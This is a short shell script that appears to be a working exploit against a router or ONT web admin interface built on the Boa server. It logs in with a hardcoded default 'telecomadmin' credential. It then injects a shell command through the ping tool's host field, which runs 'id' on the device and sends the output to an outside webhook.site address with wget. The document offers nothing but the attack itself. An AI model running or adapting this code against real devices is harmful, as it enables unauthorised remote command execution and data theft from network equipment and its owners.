curl -s -k -X $'POST' \
       --data-binary $'mode_name=/boaform/web_login_exe&nonedata=0.1337&web_login_name=telecomadmin&web_login_password=%241%24ObAYIIzP.hBmjoMZ2Sg9aabZ' \
    $"$1/boaform/web_login_exe.cgi"
    
curl -s -k -X $'POST' \
        --data-binary $'mode_name=web_ping_exe&nonedata=0.1337&mode=save&Ping_interface_select=none&Ping_ip_version_select=ipv4&Ping_host_text=$(wget%20http://webhook.site/xx/$(id))&Ping_repetition_Number_text=1&default_flag=1' \
    $"$1/boaform/web_ping_exe.cgi"
